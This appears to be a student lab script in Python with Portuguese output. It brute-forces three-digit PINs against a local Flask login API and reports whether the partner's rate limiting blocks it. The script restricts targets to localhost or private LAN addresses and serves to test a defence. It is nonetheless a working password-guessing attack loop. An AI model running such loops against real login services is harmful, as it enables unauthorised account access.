import time
import sys
from urllib.parse import urlparse
import requests

ALVO_PADRAO = "http://127.0.0.1:5000/api/login"
USUARIO_ALVO = "aluno"


def validar_url_local(url):
    parsed = urlparse(url)
    hosts_permitidos = {"127.0.0.1", "localhost", "0.0.0.0"}
    is_lan = (
        parsed.hostname in hosts_permitidos or
        (parsed.hostname and (
            parsed.hostname.startswith("192.168.") or
            parsed.hostname.startswith("10.") or
            parsed.hostname.startswith("172.16.")
        ))
    )
    if not is_lan:
        raise ValueError(
            f"Alvo inválido: '{parsed.hostname}'. Por segurança defensiva, "
            "este script de laboratório opera apenas em localhost ou rede local privada da dupla."
        )


def executar_teste_forca_bruta(url_servico=ALVO_PADRAO, usuario=USUARIO_ALVO):
    validar_url_local(url_servico)

    print("\n" + "=" * 70)
    print(" SCRIPT DE TESTE DE FORÇA BRUTA & VALIDAÇÃO DEFENSIVA (MEMBRO 2)")
    print("=" * 70)
    print(f"[*] Alvo do Serviço: {url_servico}")
    print(f"[*] Usuário Testado: '{usuario}'")
    print("[*] Intervalo de PINs: 000 até 999 (conforme pseudocódigo do docx)")
    print("[*] Iniciando teste automatizado via biblioteca 'requests'...\n")

    tentativa = 0
    encontrada = False
    senha_revelada = None
    inicio = time.time()
    bloqueado_por_defesa = False

    sessao = requests.Session()

    try:
        while tentativa <= 999 and not encontrada:
            pin_atual = f"{tentativa:03d}"

            if tentativa % 50 == 0 or (575 <= tentativa <= 585):
                print(f"[-] [{tentativa:03d}/999] Testando credencial: {usuario}:{pin_atual}")

            payload = {
                "usuario": usuario,
                "senha": pin_atual
            }

            try:
                resposta = sessao.post(
                    url_servico,
                    json=payload,
                    timeout=5.0
                )
            except requests.exceptions.ConnectionError:
                print(f"\n[ERRO DE CONEXÃO] Não foi possível conectar ao serviço em {url_servico}.")
                print("[DICA] Certifique-se de que o Membro 1 iniciou o servidor Flask com 'python3 app.py'.")
                return

            if resposta.status_code == 200:
                encontrada = True
                senha_revelada = pin_atual
                print(f"\n[+] SUCESSO: PIN Encontrado: '{senha_revelada}'!")
                break

            elif resposta.status_code == 429:
                bloqueado_por_defesa = True
                dados_resp = resposta.json() if resposta.headers.get("content-type") == "application/json" else {}
                print("\n" + "!" * 70)
                print(" [DEFESA DETECTADA] RESPOSTA HTTP 429 - TOO MANY REQUESTS")
                print(f" Mensagem do Servidor: {dados_resp.get('mensagem', 'Rate limit ativado')}")
                print(" O mecanismo de RATE LIMITING do Membro 1 identificou e bloqueou o ataque!")
                print(" O software está protegido contra força bruta automatizada.")
                print("!" * 70)
                break

            elif resposta.status_code == 401:
                tentativa += 1

            else:
                print(f"[-] Código inesperado retornado: {resposta.status_code}")
                tentativa += 1

    except KeyboardInterrupt:
        print("\n[*] Teste interrompido manualmente pelo usuário.")

    fim = time.time()
    duracao = fim - inicio
    total_requisicoes = tentativa if not encontrada else tentativa + 1

    print("\n" + "=" * 70)
    print(" RELATÓRIO DE EXECUÇÃO DO TESTE")
    print("=" * 70)
    print(f"• Total de tentativas efetuadas: {total_requisicoes}")
    print(f"• Tempo total decorrido: {duracao:.2f} segundos")
    if duracao > 0:
        print(f"• Velocidade média: {total_requisicoes / duracao:.1f} requisições/segundo")

    if encontrada:
        print(f"• Status da Senha: DESCOBERTA (PIN: {senha_revelada})")
        print("• Conclusão: Senha fraca sem limitação de tentativas foi vulnerável à força bruta.")
    elif bloqueado_por_defesa:
        print("• Status da Defesa: SUCESSO DEFENSIVO")
        print("• Conclusão: A implementação de Rate Limiting e Throttling impediu a conclusão do ataque.")
    else:
        print("• Status da Senha: Não localizada no intervalo 000-999.")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    url_alvo = sys.argv[1] if len(sys.argv) > 1 else ALVO_PADRAO
    executar_teste_forca_bruta(url_alvo)
